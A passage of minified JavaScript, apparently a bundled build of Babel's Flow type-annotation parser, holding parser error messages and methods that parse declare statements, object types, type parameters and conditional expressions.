declaration has a default.",NestedDeclareModule:"`declare module` cannot be used inside another `declare module`.",NestedFlowComment:"Cannot have a flow comment inside another flow comment.",PatternIsOptional:Object.assign({message:"A binding pattern parameter cannot be optional in an implementation signature."},{reasonCode:"OptionalBindingPattern"}),SetterMayNotHaveThisParam:"A setter cannot have a `this` parameter.",SpreadVariance:"Spread properties cannot have variance.",ThisParamAnnotationRequired:"A type annotation is required for the `this` parameter.",ThisParamBannedInConstructor:"Constructors cannot have a `this` parameter; constructors don't bind `this` like other functions.",ThisParamMayNotBeOptional:"The `this` parameter cannot be optional.",ThisParamMustBeFirst:"The `this` parameter must be the first function parameter.",ThisParamNoDefault:"The `this` parameter may not have a default value.",TypeBeforeInitializer:"Type annotations must come before default assignments, e.g. instead of `age = 25: number` use `age: number = 25`.",TypeCastInPattern:"The type cast expression is expected to be wrapped with parenthesis.",UnexpectedExplicitInexactInObject:"Explicit inexact syntax must appear at the end of an inexact object.",UnexpectedReservedType:({reservedType:X})=>`Unexpected reserved type ${X}.`,UnexpectedReservedUnderscore:"`_` is only allowed as a type argument to call or new.",UnexpectedSpaceBetweenModuloChecks:"Spaces between `%` and `checks` are not allowed here.",UnexpectedSpreadType:"Spread operator cannot appear in class or interface definitions.",UnexpectedSubtractionOperand:'Unexpected token, expected "number" or "bigint".',UnexpectedTokenAfterTypeParameter:"Expected an arrow function after this type parameter declaration.",UnexpectedTypeParameterBeforeAsyncArrowFunction:"Type parameters must come after the async keyword, e.g. instead of `<T> async () => {}`, use `async <T>() => {}`.",UnsupportedDeclareExportKind:({unsupportedExportKind:X,suggestion:J})=>`\`declare export ${X}\` is not supported. Use \`${J}\` instead.`,UnsupportedStatementInDeclareModule:"Only declares and type imports are allowed inside declare module.",UnterminatedFlowComment:"Unterminated flow-comment."});function rP(X){return X.type==="DeclareExportAllDeclaration"||X.type==="DeclareExportDeclaration"&&(!X.declaration||X.declaration.type!=="TypeAlias"&&X.declaration.type!=="InterfaceDeclaration")}function T$(X){return X.importKind==="type"||X.importKind==="typeof"}var aP={const:"declare export var",let:"declare export var",type:"export type",interface:"export interface"};function nP(X,J){let Q=[],Y=[];for(let W=0;W<X.length;W++)(J(X[W],W,X)?Q:Y).push(X[W]);return[Q,Y]}var sP=/\*?\s*@((?:no)?flow)\b/,oP=(X)=>class extends X{constructor(...Q){super(...Q);this.flowPragma=void 0}getScopeHandler(){return r$}shouldParseTypes(){return this.getPluginOption("flow","all")||this.flowPragma==="flow"}finishToken(Q,Y){if(Q!==134&&Q!==13&&Q!==28){if(this.flowPragma===void 0)this.flowPragma=null}super.finishToken(Q,Y)}addComment(Q){if(this.flowPragma===void 0){let Y=sP.exec(Q.value);if(!Y);else if(Y[1]==="flow")this.flowPragma="flow";else if(Y[1]==="noflow")this.flowPragma="noflow";else throw Error("Unexpected flow pragma")}super.addComment(Q)}flowParseTypeInitialiser(Q){let Y=this.state.inType;this.state.inType=!0,this.expect(Q||14);let W=this.flowParseType();return this.state.inType=Y,W}flowParsePredicate(){let Q=this.startNode(),Y=this.state.startLoc;if(this.next(),this.expectContextual(110),this.state.lastTokStartLoc.index>Y.index+1)this.raise(A1.UnexpectedSpaceBetweenModuloChecks,Y);if(this.eat(10))return Q.value=super.parseExpression(),this.expect(11),this.finishNode(Q,"DeclaredPredicate");else return this.finishNode(Q,"InferredPredicate")}flowParseTypeAndPredicateInitialiser(){let Q=this.state.inType;this.state.inType=!0,this.expect(14);let Y=null,W=null;if(this.match(54))this.state.inType=Q,W=this.flowParsePredicate();else if(Y=this.flowParseType(),this.state.inType=Q,this.match(54))W=this.flowParsePredicate();return[Y,W]}flowParseDeclareClass(Q){return this.next(),this.flowParseInterfaceish(Q,!0),this.finishNode(Q,"DeclareClass")}flowParseDeclareFunction(Q){this.next();let Y=Q.id=this.parseIdentifier(),W=this.startNode(),G=this.startNode();if(this.match(47))W.typeParameters=this.flowParseTypeParameterDeclaration();else W.typeParameters=null;this.expect(10);let H=this.flowParseFunctionTypeParams();return W.params=H.params,W.rest=H.rest,W.this=H._this,this.expect(11),[W.returnType,Q.predicate]=this.flowParseTypeAndPredicateInitialiser(),G.typeAnnotation=this.finishNode(W,"FunctionTypeAnnotation"),Y.typeAnnotation=this.finishNode(G,"TypeAnnotation"),this.resetEndLocation(Y),this.semicolon(),this.scope.declareName(Q.id.name,2048,Q.id.loc.start),this.finishNode(Q,"DeclareFunction")}flowParseDeclare(Q,Y){if(this.match(80))return this.flowParseDeclareClass(Q);else if(this.match(68))return this.flowParseDeclareFunction(Q);else if(this.match(74))return this.flowParseDeclareVariable(Q);else if(this.eatContextual(127))if(this.match(16))return this.flowParseDeclareModuleExports(Q);else{if(Y)this.raise(A1.NestedDeclareModule,this.state.lastTokStartLoc);return this.flowParseDeclareModule(Q)}else if(this.isContextual(130))return this.flowParseDeclareTypeAlias(Q);else if(this.isContextual(131))return this.flowParseDeclareOpaqueType(Q);else if(this.isContextual(129))return this.flowParseDeclareInterface(Q);else if(this.match(82))return this.flowParseDeclareExportDeclaration(Q,Y);else this.unexpected()}flowParseDeclareVariable(Q){return this.next(),Q.id=this.flowParseTypeAnnotatableIdentifier(!0),this.scope.declareName(Q.id.name,5,Q.id.loc.start),this.semicolon(),this.finishNode(Q,"DeclareVariable")}flowParseDeclareModule(Q){if(this.scope.enter(0),this.match(134))Q.id=super.parseExprAtom();else Q.id=this.parseIdentifier();let Y=Q.body=this.startNode(),W=Y.body=[];this.expect(5);while(!this.match(8)){let z=this.startNode();if(this.match(83)){if(this.next(),!this.isContextual(130)&&!this.match(87))this.raise(A1.InvalidNonTypeImportInDeclareModule,this.state.lastTokStartLoc);super.parseImport(z)}else this.expectContextual(125,A1.UnsupportedStatementInDeclareModule),z=this.flowParseDeclare(z,!0);W.push(z)}this.scope.exit(),this.expect(8),this.finishNode(Y,"BlockStatement");let G=null,H=!1;return W.forEach((z)=>{if(rP(z)){if(G==="CommonJS")this.raise(A1.AmbiguousDeclareModuleKind,z);G="ES"}else if(z.type==="DeclareModuleExports"){if(H)this.raise(A1.DuplicateDeclareModuleExports,z);if(G==="ES")this.raise(A1.AmbiguousDeclareModuleKind,z);G="CommonJS",H=!0}}),Q.kind=G||"CommonJS",this.finishNode(Q,"DeclareModule")}flowParseDeclareExportDeclaration(Q,Y){if(this.expect(82),this.eat(65)){if(this.match(68)||this.match(80))Q.declaration=this.flowParseDeclare(this.startNode());else Q.declaration=this.flowParseType(),this.semicolon();return Q.default=!0,this.finishNode(Q,"DeclareExportDeclaration")}else{if(this.match(75)||this.isLet()||(this.isContextual(130)||this.isContextual(129))&&!Y){let W=this.state.value;throw this.raise(A1.UnsupportedDeclareExportKind,this.state.startLoc,{unsupportedExportKind:W,suggestion:aP[W]})}if(this.match(74)||this.match(68)||this.match(80)||this.isContextual(131))return Q.declaration=this.flowParseDeclare(this.startNode()),Q.default=!1,this.finishNode(Q,"DeclareExportDeclaration");else if(this.match(55)||this.match(5)||this.isContextual(129)||this.isContextual(130)||this.isContextual(131))if(Q=this.parseExport(Q,null),Q.type==="ExportNamedDeclaration")return Q.default=!1,delete Q.exportKind,this.castNodeTo(Q,"DeclareExportDeclaration");else return this.castNodeTo(Q,"DeclareExportAllDeclaration")}this.unexpected()}flowParseDeclareModuleExports(Q){return this.next(),this.expectContextual(111),Q.typeAnnotation=this.flowParseTypeAnnotation(),this.semicolon(),this.finishNode(Q,"DeclareModuleExports")}flowParseDeclareTypeAlias(Q){this.next();let Y=this.flowParseTypeAlias(Q);return this.castNodeTo(Y,"DeclareTypeAlias"),Y}flowParseDeclareOpaqueType(Q){this.next();let Y=this.flowParseOpaqueType(Q,!0);return this.castNodeTo(Y,"DeclareOpaqueType"),Y}flowParseDeclareInterface(Q){return this.next(),this.flowParseInterfaceish(Q,!1),this.finishNode(Q,"DeclareInterface")}flowParseInterfaceish(Q,Y){if(Q.id=this.flowParseRestrictedIdentifier(!Y,!0),this.scope.declareName(Q.id.name,Y?17:8201,Q.id.loc.start),this.match(47))Q.typeParameters=this.flowParseTypeParameterDeclaration();else Q.typeParameters=null;if(Q.extends=[],this.eat(81))do Q.extends.push(this.flowParseInterfaceExtends());while(!Y&&this.eat(12));if(Y){if(Q.implements=[],Q.mixins=[],this.eatContextual(117))do Q.mixins.push(this.flowParseInterfaceExtends());while(this.eat(12));if(this.eatContextual(113))do Q.implements.push(this.flowParseInterfaceExtends());while(this.eat(12))}Q.body=this.flowParseObjectType({allowStatic:Y,allowExact:!1,allowSpread:!1,allowProto:Y,allowInexact:!1})}flowParseInterfaceExtends(){let Q=this.startNode();if(Q.id=this.flowParseQualifiedTypeIdentifier(),this.match(47))Q.typeParameters=this.flowParseTypeParameterInstantiation();else Q.typeParameters=null;return this.finishNode(Q,"InterfaceExtends")}flowParseInterface(Q){return this.flowParseInterfaceish(Q,!1),this.finishNode(Q,"InterfaceDeclaration")}checkNotUnderscore(Q){if(Q==="_")this.raise(A1.UnexpectedReservedUnderscore,this.state.startLoc)}checkReservedType(Q,Y,W){if(!iP.has(Q))return;this.raise(W?A1.AssignReservedType:A1.UnexpectedReservedType,Y,{reservedType:Q})}flowParseRestrictedIdentifier(Q,Y){return this.checkReservedType(this.state.value,this.state.startLoc,Y),this.parseIdentifier(Q)}flowParseTypeAlias(Q){if(Q.id=this.flowParseRestrictedIdentifier(!1,!0),this.scope.declareName(Q.id.name,8201,Q.id.loc.start),this.match(47))Q.typeParameters=this.flowParseTypeParameterDeclaration();else Q.typeParameters=null;return Q.right=this.flowParseTypeInitialiser(29),this.semicolon(),this.finishNode(Q,"TypeAlias")}flowParseOpaqueType(Q,Y){if(this.expectContextual(130),Q.id=this.flowParseRestrictedIdentifier(!0,!0),this.scope.declareName(Q.id.name,8201,Q.id.loc.start),this.match(47))Q.typeParameters=this.flowParseTypeParameterDeclaration();else Q.typeParameters=null;if(Q.supertype=null,this.match(14))Q.supertype=this.flowParseTypeInitialiser(14);if(Q.impltype=null,!Y)Q.impltype=this.flowParseTypeInitialiser(29);return this.semicolon(),this.finishNode(Q,"OpaqueType")}flowParseTypeParameter(Q=!1){let Y=this.state.startLoc,W=this.startNode(),G=this.flowParseVariance(),H=this.flowParseTypeAnnotatableIdentifier();if(W.name=H.name,W.variance=G,W.bound=H.typeAnnotation,this.match(29))this.eat(29),W.default=this.flowParseType();else if(Q)this.raise(A1.MissingTypeParamDefault,Y);return this.finishNode(W,"TypeParameter")}flowParseTypeParameterDeclaration(){let Q=this.state.inType,Y=this.startNode();if(Y.params=[],this.state.inType=!0,this.match(47)||this.match(143))this.next();else this.unexpected();let W=!1;do{let G=this.flowParseTypeParameter(W);if(Y.params.push(G),G.default)W=!0;if(!this.match(48))this.expect(12)}while(!this.match(48));return this.expect(48),this.state.inType=Q,this.finishNode(Y,"TypeParameterDeclaration")}flowInTopLevelContext(Q){if(this.curContext()!==e1.brace){let Y=this.state.context;this.state.context=[Y[0]];try{return Q()}finally{this.state.context=Y}}else return Q()}flowParseTypeParameterInstantiationInExpression(){if(this.reScan_lt()!==47)return;return this.flowParseTypeParameterInstantiation()}flowParseTypeParameterInstantiation(){let Q=this.startNode(),Y=this.state.inType;if(this.state.inType=!0,Q.params=[],this.flowInTopLevelContext(()=>{this.expect(47);let W=this.state.noAnonFunctionType;this.state.noAnonFunctionType=!1;while(!this.match(48))if(Q.params.push(this.flowParseType()),!this.match(48))this.expect(12);this.state.noAnonFunctionType=W}),this.state.inType=Y,!this.state.inType&&this.curContext()===e1.brace)this.reScan_lt_gt();return this.expect(48),this.finishNode(Q,"TypeParameterInstantiation")}flowParseTypeParameterInstantiationCallOrNew(){if(this.reScan_lt()!==47)return;let Q=this.startNode(),Y=this.state.inType;Q.params=[],this.state.inType=!0,this.expect(47);while(!this.match(48))if(Q.params.push(this.flowParseTypeOrImplicitInstantiation()),!this.match(48))this.expect(12);return this.expect(48),this.state.inType=Y,this.finishNode(Q,"TypeParameterInstantiation")}flowParseInterfaceType(){let Q=this.startNode();if(this.expectContextual(129),Q.extends=[],this.eat(81))do Q.extends.push(this.flowParseInterfaceExtends());while(this.eat(12));return Q.body=this.flowParseObjectType({allowStatic:!1,allowExact:!1,allowSpread:!1,allowProto:!1,allowInexact:!1}),this.finishNode(Q,"InterfaceTypeAnnotation")}flowParseObjectPropertyKey(){return this.match(135)||this.match(134)?super.parseExprAtom():this.parseIdentifier(!0)}flowParseObjectTypeIndexer(Q,Y,W){if(Q.static=Y,this.lookahead().type===14)Q.id=this.flowParseObjectPropertyKey(),Q.key=this.flowParseTypeInitialiser();else Q.id=null,Q.key=this.flowParseType();return this.expect(3),Q.value=this.flowParseTypeInitialiser(),Q.variance=W,this.finishNode(Q,"ObjectTypeIndexer")}flowParseObjectTypeInternalSlot(Q,Y){if(Q.static=Y,Q.id=this.flowParseObjectPropertyKey(),this.expect(3),this.expect(3),this.match(47)||this.match(10))Q.method=!0,Q.optional=!1,Q.value=this.flowParseObjectTypeMethodish(this.startNodeAt(Q.loc.start));else{if(Q.method=!1,this.eat(17))Q.optional=!0;Q.value=this.flowParseTypeInitialiser()}return this.finishNode(Q,"ObjectTypeInternalSlot")}flowParseObjectTypeMethodish(Q){if(Q.params=[],Q.rest=null,Q.typeParameters=null,Q.this=null,this.match(47))Q.typeParameters=this.flowParseTypeParameterDeclaration();if(this.expect(10),this.match(78)){if(Q.this=this.flowParseFunctionTypeParam(!0),Q.this.name=null,!this.match(11))this.expect(12)}while(!this.match(11)&&!this.match(21))if(Q.params.push(this.flowParseFunctionTypeParam(!1)),!this.match(11))this.expect(12);if(this.eat(21))Q.rest=this.flowParseFunctionTypeParam(!1);return this.expect(11),Q.returnType=this.flowParseTypeInitialiser(),this.finishNode(Q,"FunctionTypeAnnotation")}flowParseObjectTypeCallProperty(Q,Y){let W=this.startNode();return Q.static=Y,Q.value=this.flowParseObjectTypeMethodish(W),this.finishNode(Q,"ObjectTypeCallProperty")}flowParseObjectType({allowStatic:Q,allowExact:Y,allowSpread:W,allowProto:G,allowInexact:H}){let z=this.state.inType;this.state.inType=!0;let $=this.startNode();$.callProperties=[],$.properties=[],$.indexers=[],$.internalSlots=[];let V,K,Z=!1;if(Y&&this.match(6))this.expect(6),V=9,K=!0;else this.expect(5),V=8,K=!1;$.exact=K;while(!this.match(V)){let B=!1,M=null,O=null,R=this.startNode();if(G&&this.isContextual(118)){let F=this.lookahead();if(F.type!==14&&F.type!==17)this.next(),M=this.state.startLoc,Q=!1}if(Q&&this.isContextual(106)){let F=this.lookahead();if(F.type!==14&&F.type!==17)this.next(),B=!0}let I=this.flowParseVariance();if(this.eat(0)){if(M!=null)this.unexpected(M);if(this.eat(0)){if(I)this.unexpected(I.loc.start);$.internalSlots.push(this.flowParseObjectTypeInternalSlot(R,B))}else $.indexers.push(this.flowParseObjectTypeIndexer(R,B,I))}else if(this.match(10)||this.match(47)){if(M!=null)this.unexpected(M);if(I)this.unexpected(I.loc.start);$.callProperties.push(this.flowParseObjectTypeCallProperty(R,B))}else{let F="init";if(this.isContextual(99)||this.isContextual(104)){let b=this.lookahead();if(g$(b.type))F=this.state.value,this.next()}let T=this.flowParseObjectTypeProperty(R,B,M,I,F,W,H!=null?H:!K);if(T===null)Z=!0,O=this.state.lastTokStartLoc;else $.properties.push(T)}if(this.flowObjectTypeSemicolon(),O&&!this.match(8)&&!this.match(9))this.raise(A1.UnexpectedExplicitInexactInObject,O)}if(this.expect(V),W)$.inexact=Z;let q=this.finishNode($,"ObjectTypeAnnotation");return this.state.inType=z,q}flowParseObjectTypeProperty(Q,Y,W,G,H,z,$){if(this.eat(21)){if(this.match(12)||this.match(13)||this.match(8)||this.match(9)){if(!z)this.raise(A1.InexactInsideNonObject,this.state.lastTokStartLoc);else if(!$)this.raise(A1.InexactInsideExact,this.state.lastTokStartLoc);if(G)this.raise(A1.InexactVariance,G);return null}if(!z)this.raise(A1.UnexpectedSpreadType,this.state.lastTokStartLoc);if(W!=null)this.unexpected(W);if(G)this.raise(A1.SpreadVariance,G);return Q.argument=this.flowParseType(),this.finishNode(Q,"ObjectTypeSpreadProperty")}else{Q.key=this.flowParseObjectPropertyKey(),Q.static=Y,Q.proto=W!=null,Q.kind=H;let V=!1;if(this.match(47)||this.match(10)){if(Q.method=!0,W!=null)this.unexpected(W);if(G)this.unexpected(G.loc.start);if(Q.value=this.flowParseObjectTypeMethodish(this.startNodeAt(Q.loc.start)),H==="get"||H==="set")this.flowCheckGetterSetterParams(Q);if(!z&&Q.key.name==="constructor"&&Q.value.this)this.raise(A1.ThisParamBannedInConstructor,Q.value.this)}else{if(H!=="init")this.unexpected();if(Q.method=!1,this.eat(17))V=!0;Q.value=this.flowParseTypeInitialiser(),Q.variance=G}return Q.optional=V,this.finishNode(Q,"ObjectTypeProperty")}}flowCheckGetterSetterParams(Q){let Y=Q.kind==="get"?0:1,W=Q.value.params.length+(Q.value.rest?1:0);if(Q.value.this)this.raise(Q.kind==="get"?A1.GetterMayNotHaveThisParam:A1.SetterMayNotHaveThisParam,Q.value.this);if(W!==Y)this.raise(Q.kind==="get"?S.BadGetterArity:S.BadSetterArity,Q);if(Q.kind==="set"&&Q.value.rest)this.raise(S.BadSetterRestParameter,Q)}flowObjectTypeSemicolon(){if(!this.eat(13)&&!this.eat(12)&&!this.match(8)&&!this.match(9))this.unexpected()}flowParseQualifiedTypeIdentifier(Q,Y){Q!=null||(Q=this.state.startLoc);let W=Y||this.flowParseRestrictedIdentifier(!0);while(this.eat(16)){let G=this.startNodeAt(Q);G.qualification=W,G.id=this.flowParseRestrictedIdentifier(!0),W=this.finishNode(G,"QualifiedTypeIdentifier")}return W}flowParseGenericType(Q,Y){let W=this.startNodeAt(Q);if(W.typeParameters=null,W.id=this.flowParseQualifiedTypeIdentifier(Q,Y),this.match(47))W.typeParameters=this.flowParseTypeParameterInstantiation();return this.finishNode(W,"GenericTypeAnnotation")}flowParseTypeofType(){let Q=this.startNode();return this.expect(87),Q.argument=this.flowParsePrimaryType(),this.finishNode(Q,"TypeofTypeAnnotation")}flowParseTupleType(){let Q=this.startNode();Q.types=[],this.expect(0);while(this.state.pos<this.length&&!this.match(3)){if(Q.types.push(this.flowParseType()),this.match(3))break;this.expect(12)}return this.expect(3),this.finishNode(Q,"TupleTypeAnnotation")}flowParseFunctionTypeParam(Q){let Y=null,W=!1,G=null,H=this.startNode(),z=this.lookahead(),$=this.state.type===78;if(z.type===14||z.type===17){if($&&!Q)this.raise(A1.ThisParamMustBeFirst,H);if(Y=this.parseIdentifier($),this.eat(17)){if(W=!0,$)this.raise(A1.ThisParamMayNotBeOptional,H)}G=this.flowParseTypeInitialiser()}else G=this.flowParseType();return H.name=Y,H.optional=W,H.typeAnnotation=G,this.finishNode(H,"FunctionTypeParam")}reinterpretTypeAsFunctionTypeParam(Q){let Y=this.startNodeAt(Q.loc.start);return Y.name=null,Y.optional=!1,Y.typeAnnotation=Q,this.finishNode(Y,"FunctionTypeParam")}flowParseFunctionTypeParams(Q=[]){let Y=null,W=null;if(this.match(78)){if(W=this.flowParseFunctionTypeParam(!0),W.name=null,!this.match(11))this.expect(12)}while(!this.match(11)&&!this.match(21))if(Q.push(this.flowParseFunctionTypeParam(!1)),!this.match(11))this.expect(12);if(this.eat(21))Y=this.flowParseFunctionTypeParam(!1);return{params:Q,rest:Y,_this:W}}flowIdentToTypeAnnotation(Q,Y,W){switch(W.name){case"any":return this.finishNode(Y,"AnyTypeAnnotation");case"bool":case"boolean":return this.finishNode(Y,"BooleanTypeAnnotation");case"mixed":return this.finishNode(Y,"MixedTypeAnnotation");case"empty":return this.finishNode(Y,"EmptyTypeAnnotation");case"number":return this.finishNode(Y,"NumberTypeAnnotation");case"string":return this.finishNode(Y,"StringTypeAnnotation");case"symbol":return this.finishNode(Y,"SymbolTypeAnnotation");default:return this.checkNotUnderscore(W.name),this.flowParseGenericType(Q,W)}}flowParsePrimaryType(){let Q=this.state.startLoc,Y=this.startNode(),W,G,H=!1,z=this.state.noAnonFunctionType;switch(this.state.type){case 5:return this.flowParseObjectType({allowStatic:!1,allowExact:!1,allowSpread:!0,allowProto:!1,allowInexact:!0});case 6:return this.flowParseObjectType({allowStatic:!1,allowExact:!0,allowSpread:!0,allowProto:!1,allowInexact:!1});case 0:return this.state.noAnonFunctionType=!1,G=this.flowParseTupleType(),this.state.noAnonFunctionType=z,G;case 47:{let $=this.startNode();return $.typeParameters=this.flowParseTypeParameterDeclaration(),this.expect(10),W=this.flowParseFunctionTypeParams(),$.params=W.params,$.rest=W.rest,$.this=W._this,this.expect(11),this.expect(19),$.returnType=this.flowParseType(),this.finishNode($,"FunctionTypeAnnotation")}case 10:{let $=this.startNode();if(this.next(),!this.match(11)&&!this.match(21))if(W0(this.state.type)||this.match(78)){let V=this.lookahead().type;H=V!==17&&V!==14}else H=!0;if(H)if(this.state.noAnonFunctionType=!1,G=this.flowParseType(),this.state.noAnonFunctionType=z,this.state.noAnonFunctionType||!(this.match(12)||this.match(11)&&this.lookahead().type===19))return this.expect(11),G;else this.eat(12);if(G)W=this.flowParseFunctionTypeParams([this.reinterpretTypeAsFunctionTypeParam(G)]);else W=this.flowParseFunctionTypeParams();return $.params=W.params,$.rest=W.rest,$.this=W._this,this.expect(11),this.expect(19),$.returnType=this.flowParseType(),$.typeParameters=null,this.finishNode($,"FunctionTypeAnnotation")}case 134:return this.parseLiteral(this.state.value,"StringLiteralTypeAnnotation");case 85:case 86:return Y.value=this.match(85),this.next(),this.finishNode(Y,"BooleanLiteralTypeAnnotation");case 53:if(this.state.value==="-"){if(this.next(),this.match(135))return this.parseLiteralAtNode(-this.state.value,"NumberLiteralTypeAnnotation",Y);if(this.match(136))return this.parseLiteralAtNode(-this.state.value,"BigIntLiteralTypeAnnotation",Y);throw this.raise(A1.UnexpectedSubtractionOperand,this.state.startLoc)}this.unexpected();return;case 135:return this.parseLiteral(this.state.value,"NumberLiteralTypeAnnotation");case 136:return this.parseLiteral(this.state.value,"BigIntLiteralTypeAnnotation");case 88:return this.next(),this.finishNode(Y,"VoidTypeAnnotation");case 84:return this.next(),this.finishNode(Y,"NullLiteralTypeAnnotation");case 78:return this.next(),this.finishNode(Y,"ThisTypeAnnotation");case 55:return this.next(),this.finishNode(Y,"ExistsTypeAnnotation");case 87:return this.flowParseTypeofType();default:if(x2(this.state.type)){let $=WX(this.state.type);return this.next(),super.createIdentifier(Y,$)}else if(W0(this.state.type)){if(this.isContextual(129))return this.flowParseInterfaceType();return this.flowIdentToTypeAnnotation(Q,Y,this.parseIdentifier())}}this.unexpected()}flowParsePostfixType(){let Q=this.state.startLoc,Y=this.flowParsePrimaryType(),W=!1;while((this.match(0)||this.match(18))&&!this.canInsertSemicolon()){let G=this.startNodeAt(Q),H=this.eat(18);if(W=W||H,this.expect(0),!H&&this.match(3))G.elementType=Y,this.next(),Y=this.finishNode(G,"ArrayTypeAnnotation");else if(G.objectType=Y,G.indexType=this.flowParseType(),this.expect(3),W)G.optional=H,Y=this.finishNode(G,"OptionalIndexedAccessType");else Y=this.finishNode(G,"IndexedAccessType")}return Y}flowParsePrefixType(){let Q=this.startNode();if(this.eat(17))return Q.typeAnnotation=this.flowParsePrefixType(),this.finishNode(Q,"NullableTypeAnnotation");else return this.flowParsePostfixType()}flowParseAnonFunctionWithoutParens(){let Q=this.flowParsePrefixType();if(!this.state.noAnonFunctionType&&this.eat(19)){let Y=this.startNodeAt(Q.loc.start);return Y.params=[this.reinterpretTypeAsFunctionTypeParam(Q)],Y.rest=null,Y.this=null,Y.returnType=this.flowParseType(),Y.typeParameters=null,this.finishNode(Y,"FunctionTypeAnnotation")}return Q}flowParseIntersectionType(){let Q=this.startNode();this.eat(45);let Y=this.flowParseAnonFunctionWithoutParens();Q.types=[Y];while(this.eat(45))Q.types.push(this.flowParseAnonFunctionWithoutParens());return Q.types.length===1?Y:this.finishNode(Q,"IntersectionTypeAnnotation")}flowParseUnionType(){let Q=this.startNode();this.eat(43);let Y=this.flowParseIntersectionType();Q.types=[Y];while(this.eat(43))Q.types.push(this.flowParseIntersectionType());return Q.types.length===1?Y:this.finishNode(Q,"UnionTypeAnnotation")}flowParseType(){let Q=this.state.inType;this.state.inType=!0;let Y=this.flowParseUnionType();return this.state.inType=Q,Y}flowParseTypeOrImplicitInstantiation(){if(this.state.type===132&&this.state.value==="_"){let Q=this.state.startLoc,Y=this.parseIdentifier();return this.flowParseGenericType(Q,Y)}else return this.flowParseType()}flowParseTypeAnnotation(){let Q=this.startNode();return Q.typeAnnotation=this.flowParseTypeInitialiser(),this.finishNode(Q,"TypeAnnotation")}flowParseTypeAnnotatableIdentifier(Q){let Y=Q?this.parseIdentifier():this.flowParseRestrictedIdentifier();if(this.match(14))Y.typeAnnotation=this.flowParseTypeAnnotation(),this.resetEndLocation(Y);return Y}typeCastToParameter(Q){return Q.expression.typeAnnotation=Q.typeAnnotation,this.resetEndLocation(Q.expression,Q.typeAnnotation.loc.end),Q.expression}flowParseVariance(){let Q=null;if(this.match(53)){if(Q=this.startNode(),this.state.value==="+")Q.kind="plus";else Q.kind="minus";return this.next(),this.finishNode(Q,"Variance")}return Q}parseFunctionBody(Q,Y,W=!1){if(Y){this.forwardNoArrowParamsConversionAt(Q,()=>super.parseFunctionBody(Q,!0,W));return}super.parseFunctionBody(Q,!1,W)}parseFunctionBodyAndFinish(Q,Y,W=!1){if(this.match(14)){let G=this.startNode();[G.typeAnnotation,Q.predicate]=this.flowParseTypeAndPredicateInitialiser(),Q.returnType=G.typeAnnotation?this.finishNode(G,"TypeAnnotation"):null}return super.parseFunctionBodyAndFinish(Q,Y,W)}parseStatementLike(Q){if(this.state.strict&&this.isContextual(129)){let W=this.lookahead();if(u9(W.type)){let G=this.startNode();return this.next(),this.flowParseInterface(G)}}else if(this.isContextual(126)){let W=this.startNode();return this.next(),this.flowParseEnumDeclaration(W)}let Y=super.parseStatementLike(Q);if(this.flowPragma===void 0&&!this.isValidDirective(Y))this.flowPragma=null;return Y}parseExpressionStatement(Q,Y,W){if(Y.type==="Identifier"){if(Y.name==="declare"){if(this.match(80)||W0(this.state.type)||this.match(68)||this.match(74)||this.match(82))return this.flowParseDeclare(Q)}else if(W0(this.state.type)){if(Y.name==="interface")return this.flowParseInterface(Q);else if(Y.name==="type")return this.flowParseTypeAlias(Q);else if(Y.name==="opaque")return this.flowParseOpaqueType(Q,!1)}}return super.parseExpressionStatement(Q,Y,W)}shouldParseExportDeclaration(){let{type:Q}=this.state;if(Q===126||S$(Q))return!this.state.containsEsc;return super.shouldParseExportDeclaration()}isExportDefaultSpecifier(){let{type:Q}=this.state;if(Q===126||S$(Q))return this.state.containsEsc;return super.isExportDefaultSpecifier()}parseExportDefaultExpression(){if(this.isContextual(126)){let Q=this.startNode();return this.next(),this.flowParseEnumDeclaration(Q)}return super.parseExportDefaultExpression()}parseConditional(Q,Y,W){if(!this.match(17))return Q;if(this.state.maybeInArrowParameters){let q=this.lookaheadCharCode();if(q===44||q===61||q===58||q===41)return this.setOptionalParametersError(W),Q}this.expect(17);let G=this.state.clone(),H=this.state.noArrowAt,z=this.startNodeAt(Y),{consequent:$,failed:V}=this.tryParseConditionalConsequent(),[K,Z]=this.getArrowLikeExpressions($);if(V||Z.length>0){let q=[...H];if(Z.length>0){this.state=G,this.state.noArrowAt=q;for(let B=0;B<Z.length;B++)q.push(Z[B].start);({consequent:$,failed:V}=this.tryParseConditionalConsequent()),[K,Z]=this.getArrowLikeExpressions($)}if(V&&K.length>1)this.raise(A1.AmbiguousConditionalArrow,G.startLoc);if(V&&K.length===1)this.state=G,q.push(K[0].start),this.state.noArrowAt=q,{consequent:$,failed:V}=this.tryParseConditionalConsequent()}return this.getArrowLikeExpressions($,!0),this.state.noArrowAt=H,this.expect(14),z.test=Q,z.consequent=$,z.alternate=this.forwardNoArrowParamsConversionAt(z,()=>this.parseMaybeAssign(void 0,void 0)),this.finishNode(z,"ConditionalExpression")}tryParseConditionalConsequent(){this.state.noArrowParamsConversionAt.push(this.state.start);let Q=this.parseMaybeAssignAllowIn(),Y=!this.match(14);return this.state.noArrowParamsConversionAt.pop(),{consequent:Q,failed:Y}}getArrowLikeExpressions(Q,Y){let W=[Q],G=[];while(W.length!==0){let H=W.pop();if(H.type==="ArrowFunctionExpression"&&H.body.type!=="BlockStatement"){if(H.typeParameters||!H.returnType)this.finishArrowValidation(H);else G.push(H);W.push(H.body)}else if(H.type==="ConditionalExpression")W.push(H.consequent),W.push(H.alternate)}if(Y)return G.forEach((H)=>this.finishArrowValidation(H)),[G,[]];return nP(G,(H)=>H.params.every((z)=>this.isAssignable(z,!0)))}finishArrowValidation(Q){var Y;this.toAssignableList(Q.params,(Y=Q.extra)==null?void 0:Y.trailingCommaLoc,!1),this.scope.enter(518),super.checkParams(Q,!1,!0),this.scope.exit()}forwardNoArrowParamsConversionAt(Q,Y){let W;if(this.state.noArrowParamsConversionAt.includes(this.offsetToSourcePos(Q.start)))this.state.noArrowParamsConversionAt.push(this.state.start),W=Y(),this.state.noArrowParamsConversionAt.pop();else W=Y();return W}parseParenItem(Q,Y){let W=super.parseParenItem(Q,Y);if(this.eat(17))W.optional=!0,this.resetEndLocation(Q);if(this.match(14)){let G=this.startNodeAt(Y);return G.expression=W,G.typeAnnotation=this.flowParseTypeAnnotation(),this.finishNode(G,"TypeCastExpression")}return W}assertModuleNodeAllowed(Q){if(Q.type==="ImportDeclaration"&&(Q.importKind==="type"||Q.importKind==="typeof")||Q.type==="ExportNamedDeclaration"&&Q.exportKind==="type"||Q.type==="ExportAllDeclaration"&&Q.exportKind==="type")return;super.assertModuleNodeAllowed(Q)}parseExportDeclaration(Q){if(this.isContextual(130)){Q.exportKind="type";let Y=this.startNode();if(this.next(),this.match(5))return 